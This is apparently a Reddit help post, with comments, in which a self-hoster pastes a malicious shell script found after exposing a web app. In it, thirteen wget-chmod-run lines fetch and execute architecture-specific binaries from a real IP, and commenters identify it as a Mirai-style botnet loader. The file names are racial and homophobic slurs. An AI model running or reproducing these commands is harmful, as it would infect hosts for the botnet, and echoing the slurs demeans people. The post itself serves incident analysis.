@@ -1,0 +1,49 @@
+POST ID: 1aokh1l / POST TITLE: Within minutes of hosting a web app from my residential WAN, I see this in my nginx logs..
+====================================================================================================
+&#x200B;
+
+https://preview.redd.it/r96nwdvi81ic1.png?width=1801&format=png&auto=webp&s=18ae51ec70efb9c62d3498c7f1983084560b54d9
+
+&#x200B;
+
+Meanwhile, the contents of this n\*\*\*\*\*.sh a file...
+
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lol http://192.3.152.183/mips; chmod +x lol; ./lol sonic
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lmao http://192.3.152.183/mpsl; chmod +x lmao; ./lmao sonic
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O faggot http://192.3.152.183/x86_64; chmod +x faggot; ./faggot sonic
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O gay http://192.3.152.183/arm; chmod +x gay; ./gay sonic
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O retard http://192.3.152.183/arm5; chmod +x retard; ./retard sonic
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O nigger http://192.3.152.183/arm6; chmod +x nigger; ./nigger sonic
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O shit http://192.3.152.183/arm7; chmod +x shit; ./shit sonic
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O nigga http://192.3.152.183/i586; chmod +x nigga; ./nigga sonic
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kekw http://192.3.152.183/i686; chmod +x kekw; ./kekw sonic
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O what http://192.3.152.183/powerpc; chmod +x what; ./what sonic
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kys http://192.3.152.183/sh4; chmod +x kys; ./kys sonic
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O shiteater http://192.3.152.183/m68k; chmod +x shiteater; ./shiteater sonic
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O blyat http://192.3.152.183/sparc; chmod +x blyat; ./blyat sonic
+
+Does anyone know what these executable files do? Also, is it *normal* for this stuff to occur within literally 30 minutes of opening the DMZ of my firewall? I've hosted things in the cloud for years without anything like this showing up in my logs. I'm not too worried about any damage done, as I've isolated these docker containers to it's own VLAN.   
+
+&#x200B;
+
+If it isn't obvious already, DON'T OPEN any of the executable files unless you know what you're doing. I don't know what I'm doing, hence this post. 
+
+&#x200B;
+
+If there's a more appropriate sub for this post please let me know.
+
+POST COMMENTS:
+====================================================================================================
+ID: kq01i9u # OF UPVOTES: 4.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: They uploaded multiple versions of probably a command and control executable onto whatever the host system is. They did multiple versions of it because they arent sure what the architecture of your device is. 
+
+It’s probably an executable that scans for other devices or turns the container into some sort of zombie for future use in a ddos.
+
+You could always open the binaries in Ghidra and search for strings. You may be able to get a better idea that way.
+----------------------------------------------------------------------------------------------------
+ID: kq5vjcd # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: I'll be honest, it's a bit weird to see the name calling, I've seen short words and meaningless phrases, but never stuff like that.  Is it maybe personal?  Did you make a post to some form of social media that maybe someone who isn't your biggest fan is watching?
+----------------------------------------------------------------------------------------------------
+ID: kq6fwqx # OF UPVOTES: 1.0 SUBREDDIT: ethicalhacking
+COMMENT TEXT: I thought so too, but no I don't use social media other than reddit. Over at r/AskNetsec they told me it is Marai botnet. Another software developer posted a [medium articl](https://medium.com/@anilkb007/watching-my-server-logs-4fe06fb43252)e few days ago about it. Same IP addresses and slurs too.
+----------------------------------------------------------------------------------------------------
